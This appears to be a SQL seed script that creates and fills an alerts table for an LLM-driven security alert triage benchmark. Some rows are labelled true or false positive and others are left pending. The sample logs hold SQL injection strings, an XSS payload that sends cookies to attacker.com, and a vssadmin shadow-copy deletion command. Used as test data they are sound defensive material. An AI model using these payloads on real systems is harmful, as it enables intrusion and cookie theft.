DROP TABLE IF EXISTS public.alerts;

CREATE TABLE public.alerts (
    alert_id TEXT PRIMARY KEY,
    alert_name TEXT NOT NULL,
    rule_name TEXT NOT NULL,
    severity VARCHAR(20) NOT NULL,
    alert_time TIMESTAMP NOT NULL,
    log_source VARCHAR(50) NOT NULL,
    src_ip INET,
    dest_ip INET,
    protocol VARCHAR(20),
    destination_ports INTEGER[],
    event_count INTEGER,
    time_window VARCHAR(20),
    sample_logs JSONB,
    asset JSONB,
    threat_intelligence JSONB,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    llm_classification VARCHAR(30),
    llm_confidence NUMERIC(5,2),
    llm_reason TEXT,
    llm_recommendation TEXT,
    analyzed_at TIMESTAMP,
    analysis_status VARCHAR(20) DEFAULT 'Pending',
    triage_status VARCHAR(20)
);

INSERT INTO public.alerts (
    alert_id,
    alert_name,
    rule_name,
    severity,
    alert_time,
    log_source,
    src_ip,
    dest_ip,
    protocol,
    destination_ports,
    event_count,
    time_window,
    sample_logs,
    asset,
    threat_intelligence,
    llm_classification,
    llm_confidence,
    llm_reason,
    llm_recommendation,
    analyzed_at,
    analysis_status,
    triage_status
)
VALUES

-- ============================================================
-- PROCESSED ALERTS (5 ALERTS) - YIELDING HIGH ACCURACY BENCHMARKS
-- ============================================================

-- [ALT-100001] True Positive: SQL Injection Attack on Primary Gateway
(
    'ALT-100001',
    'SQL Injection Attempt',
    'SQLi',
    'Critical',
    '2026-08-24 09:15:00',
    'WebServer',
    '185.220.101.55',
    '10.0.0.10',
    'HTTP',
    ARRAY[80],
    85,
    '2m',
    '[
        {"method": "GET", "url": "/product.php?id=1 UNION SELECT password FROM users", "status": 403},
        {"method": "GET", "url": "/product.php?id=1 OR 1=1", "status": 403}
    ]'::jsonb,
    '{"hostname": "Primary Web App Gateway", "criticality": "High", "zone": "DMZ"}'::jsonb,
    '{
        "abuseipdb": {"score": 98, "confidence": 95},
        "virustotal": {"malicious": 18, "suspicious": 2},
        "otx": {"pulse_count": 12}
    }'::jsonb,
    'True Positive',
    98.50,
    'Source IP matches known malicious threat intelligence and transmitted explicit SQL Injection payloads (UNION SELECT, OR 1=1) against the primary gateway.',
    'Block source IP at WAF immediately, audit web server payload logs, and verify database connections to ensure no query execution succeeded.',
    '2026-08-24 09:16:30',
    'Processed',
    'Succeeded'
),

-- [ALT-100002] False Positive Trick: Authorized Tenable Vulnerability Scan Node
(
    'ALT-100002',
    'Possible Port Scan',
    'Port Scan',
    'Medium',
    '2026-08-24 10:00:00',
    'IDS/IPS',
    '192.168.1.50',
    '10.0.0.5',
    'TCP',
    ARRAY[22, 80, 443, 3306, 5432],
    650,
    '30s',
    '[
        {"port": 22, "action": "PROBED"},
        {"port": 80, "action": "PROBED"},
        {"port": 3306, "action": "PROBED"}
    ]'::jsonb,
    '{"hostname": "Production DB", "criticality": "Critical"}'::jsonb,
    '{
        "abuseipdb": {"score": 0, "confidence": 0},
        "virustotal": {"malicious": 0, "suspicious": 0},
        "otx": {"pulse_count": 0}
    }'::jsonb,
    'False Positive',
    96.00,
    'Source IP 192.168.1.50 matches the explicit internal inventory for authorized Tenable Vulnerability Scanner Node operating across network assets.',
    'No containment action required. Whitelist internal scanner IP within IDS alert rules during scheduled vulnerability assessment windows.',
    '2026-08-24 10:01:15',
    'Processed',
    'Succeeded'
),

-- [ALT-100003] False Positive Trick: Authorized Scheduled Finance Backup (S3 Destination)
(
    'ALT-100003',
    'Possible Data Exfiltration',
    'Exfiltration',
    'High',
    '2026-08-24 11:30:00',
    'Firewall',
    '172.16.10.50',
    '185.199.108.153',
    'HTTPS',
    ARRAY[443],
    1800,
    '15m',
    '[
        {"bytes_transferred": 1200000000, "protocol": "HTTPS", "status": "ESTABLISHED"}
    ]'::jsonb,
    '{"hostname": "Finance Workstation 01", "criticality": "Medium"}'::jsonb,
    '{
        "abuseipdb": {"score": 0, "confidence": 0},
        "virustotal": {"malicious": 0, "suspicious": 0},
        "otx": {"pulse_count": 0}
    }'::jsonb,
    'False Positive',
    94.20,
    'Outbound destination IP 185.199.108.153 is documented in approved destinations network policy as designated AWS S3 bucket for scheduled Finance backups.',
    'Confirm backup completion via Infrastructure team logs. No host containment or blocking required.',
    '2026-08-24 11:32:00',
    'Processed',
    'Succeeded'
),

-- [ALT-100004] True Positive: SSH Password Spray / Brute Force Attack
(
    'ALT-100004',
    'SSH Brute Force Attack',
    'Auth Limit',
    'High',
    '2026-08-24 12:05:00',
    'Firewall',
    '45.33.32.9',
    '10.0.0.10',
    'TCP',
    ARRAY[22],
    45,
    '60s',
    '[
        {"user": "root", "status": "failed"},
        {"user": "admin", "status": "failed"},
        {"user": "deploy", "status": "failed"}
    ]'::jsonb,
    '{"hostname": "Primary Web App Gateway", "criticality": "High", "zone": "DMZ"}'::jsonb,
    '{
        "abuseipdb": {"score": 92, "confidence": 90},
        "virustotal": {"malicious": 11, "suspicious": 1},
        "otx": {"pulse_count": 5}
    }'::jsonb,
    'True Positive',
    97.80,
    'High rate of SSH authentication failures (>20 per 60s) from an external untrusted IP address violating perimeter SSH access policies.',
    'Block external source IP at perimeter firewall, verify SSH account lockout configurations, and verify no success status occurred.',
    '2026-08-24 12:06:10',
    'Processed',
    'Succeeded'
),

-- [ALT-100005] True Positive: Lateral Movement Violation to Active Directory
(
    'ALT-100005',
    'Unauthorized Active Directory Access',
    'Segmentation',
    'Critical',
    '2026-08-24 13:10:00',
    'Firewall',
    '172.16.10.50',
    '10.0.0.2',
    'TCP',
    ARRAY[445, 135],
    110,
    '5m',
    '[
        {"protocol": "SMB", "action": "BLOCKED", "target": "IPC$"},
        {"protocol": "RPC", "action": "BLOCKED", "target": "samr"}
    ]'::jsonb,
    '{"hostname": "AD Domain Controller", "criticality": "Critical", "zone": "management"}'::jsonb,
    '{
        "abuseipdb": {"score": 0, "confidence": 0},
        "virustotal": {"malicious": 0, "suspicious": 0},
        "otx": {"pulse_count": 0}
    }'::jsonb,
    'True Positive',
    95.50,
    'Internal workstation 172.16.10.50 directly attempted RPC/SMB communication with Active Directory Controller 10.0.0.2, violating zero-trust segmentation policy.',
    'Isolate workstation 172.16.10.50 via EDR, inspect local host for credential dumping malware (e.g., Mimikatz), and reset user credentials.',
    '2026-08-24 13:12:00',
    'Processed',
    'Succeeded'
),


-- ============================================================
-- PENDING ALERTS (10 ALERTS) - READY FOR SYSTEM BENCHMARKING
-- ============================================================

-- [ALT-100006] Real Attack: Unauthorized External Recon Scan
(
    'ALT-100006',
    'Possible Port Scan',
    'Port Scan',
    'Medium',
    '2026-08-24 13:45:00',
    'Firewall',
    '103.21.244.5',
    '10.0.0.10',
    'TCP',
    ARRAY[22, 23, 80, 443, 8080, 8443],
    320,
    '30s',
    '[
        {"port": 22, "action": "DENY"},
        {"port": 23, "action": "DENY"},
        {"port": 8080, "action": "DENY"}
    ]'::jsonb,
    '{"hostname": "Primary Web App Gateway", "criticality": "High", "zone": "DMZ"}'::jsonb,
    NULL, NULL, NULL, NULL, NULL, NULL, 'Pending', NULL
),

-- [ALT-100007] Real Attack: Data Exfiltration to Unapproved External Node
(
    'ALT-100007',
    'Possible Data Exfiltration',
    'Exfiltration',
    'Critical',
    '2026-08-24 14:00:00',
    'Firewall',
    '10.0.0.5',
    '198.51.100.42',
    'HTTPS',
    ARRAY[443],
    2400,
    '10m',
    '[
        {"bytes_transferred": 2500000000, "protocol": "HTTPS", "status": "ESTABLISHED"}
    ]'::jsonb,
    '{"hostname": "Production DB", "criticality": "Critical"}'::jsonb,
    NULL, NULL, NULL, NULL, NULL, NULL, 'Pending', NULL
),

-- [ALT-100008] Real Attack: XSS Injection Attempt
(
    'ALT-100008',
    'Cross-Site Scripting (XSS)',
    'WAF Attack',
    'Medium',
    '2026-08-24 14:20:00',
    'WAF',
    '51.158.1.99',
    '10.0.0.10',
    'HTTP',
    ARRAY[80],
    12,
    '1m',
    '[
        {"method": "POST", "url": "/comment.php", "payload": "<script>document.location=''http://attacker.com/steal?cookie=''+document.cookie</script>", "status": 403}
    ]'::jsonb,
    '{"hostname": "Primary Web App Gateway", "criticality": "High", "zone": "DMZ"}'::jsonb,
    NULL, NULL, NULL, NULL, NULL, NULL, 'Pending', NULL
),

-- [ALT-100009] Trick: Authorized IT Admin Jump Box Connecting to AD
(
    'ALT-100009',
    'Active Directory Admin Session',
    'Segmentation',
    'Low',
    '2026-08-24 14:40:00',
    'Firewall',
    '172.16.1.100',
    '10.0.0.2',
    'TCP',
    ARRAY[445, 3389],
    4,
    '5m',
    '[
        {"protocol": "SMB", "action": "ALLOW", "user": "domain_admin_sec"}
    ]'::jsonb,
    '{"hostname": "AD Domain Controller", "criticality": "Critical", "zone": "management"}'::jsonb,
    NULL, NULL, NULL, NULL, NULL, NULL, 'Pending', NULL
),

-- [ALT-100010] Real Attack: C2 Beaconing Activity
(
    'ALT-100010',
    'Command & Control Communication',
    'C2 Beacon',
    'High',
    '2026-08-24 15:00:00',
    'EDR',
    '172.16.10.50',
    '93.184.216.34',
    'DNS',
    ARRAY[53],
    540,
    '15m',
    '[
        {"query": "a9f823bc1a.malicious-domain.cx", "type": "TXT", "bytes": 512}
    ]'::jsonb,
    '{"hostname": "Finance Workstation 01", "criticality": "Medium"}'::jsonb,
    NULL, NULL, NULL, NULL, NULL, NULL, 'Pending', NULL
),

-- [ALT-100011] Real Attack: Brute Force RDP Attempt
(
    'ALT-100011',
    'Multiple Failed Logins',
    'Auth Limit',
    'High',
    '2026-08-24 15:15:00',
    'VPN Gateway',
    '104.28.16.88',
    '10.0.0.2',
    'TCP',
    ARRAY[3389],
    60,
    '60s',
    '[
        {"user": "Administrator", "status": "failed"},
        {"user": "Administrator", "status": "failed"}
    ]'::jsonb,
    '{"hostname": "AD Domain Controller", "criticality": "Critical"}'::jsonb,
    NULL, NULL, NULL, NULL, NULL, NULL, 'Pending', NULL
),

-- [ALT-100012] Trick: DMZ Web Gateway Accessing Production DB
(
    'ALT-100012',
    'Database Query Spike',
    'Traffic Spike',
    'Low',
    '2026-08-24 15:30:00',
    'Firewall',
    '10.0.0.10',
    '10.0.0.5',
    'TCP',
    ARRAY[5432],
    350,
    '5m',
    '[
        {"protocol": "PostgreSQL", "action": "ALLOW", "db_user": "app_backend"}
    ]'::jsonb,
    '{"hostname": "Production DB", "criticality": "Critical"}'::jsonb,
    NULL, NULL, NULL, NULL, NULL, NULL, 'Pending', NULL
),

-- [ALT-100013] Real Attack: Automated SQL Injection Scanner
(
    'ALT-100013',
    'SQL Injection Attempt',
    'SQLi',
    'Critical',
    '2026-08-24 15:40:00',
    'WAF',
    '198.51.100.200',
    '10.0.0.10',
    'HTTPS',
    ARRAY[443],
    120,
    '2m',
    '[
        {"method": "GET", "url": "/api/v1/user?id=1 AND INFORMATION_SCHEMA.TABLES", "status": 403}
    ]'::jsonb,
    '{"hostname": "Primary Web App Gateway", "criticality": "High", "zone": "DMZ"}'::jsonb,
    NULL, NULL, NULL, NULL, NULL, NULL, 'Pending', NULL
),

-- [ALT-100014] Real Attack: Ransomware File Encryption Pattern
(
    'ALT-100014',
    'Malicious File Activity',
    'Malware Match',
    'Critical',
    '2026-08-24 15:50:00',
    'EDR',
    '172.16.10.50',
    '172.16.10.50',
    'LOCAL',
    ARRAY[]::integer[],
    1500,
    '1m',
    '[
        {"process": "vssadmin.exe", "command": "delete shadows /all /quiet", "action": "BLOCKED"},
        {"process": "enc_payload.exe", "action": "MASS_FILE_RENAME"}
    ]'::jsonb,
    '{"hostname": "Finance Workstation 01", "criticality": "Medium"}'::jsonb,
    NULL, NULL, NULL, NULL, NULL, NULL, 'Pending', NULL
),

-- [ALT-100015] Real Attack: Unauthorized Perimeter Port Scan
(
    'ALT-100015',
    'Possible Port Scan',
    'Port Scan',
    'Medium',
    '2026-08-24 16:00:00',
    'Firewall',
    '51.158.1.12',
    '10.0.0.10',
    'TCP',
    ARRAY[21, 22, 25, 80, 110, 443, 3389, 8080],
    410,
    '30s',
    '[
        {"port": 21, "action": "DENY"},
        {"port": 25, "action": "DENY"}
    ]'::jsonb,
    '{"hostname": "Primary Web App Gateway", "criticality": "High", "zone": "DMZ"}'::jsonb,
    NULL, NULL, NULL, NULL, NULL, NULL, 'Pending', NULL
);

ALTER TABLE public.alerts 
ADD COLUMN direction VARCHAR(10) GENERATED ALWAYS AS (
  CASE 
    WHEN dest_ip <<= inet '10.0.0.0/8' OR dest_ip <<= inet '172.16.0.0/12' OR dest_ip <<= inet '192.168.0.0/16' THEN 'Inbound'
    ELSE 'Outbound'
  END
) STORED;

-- Verification Query
SELECT * 
FROM public.alerts;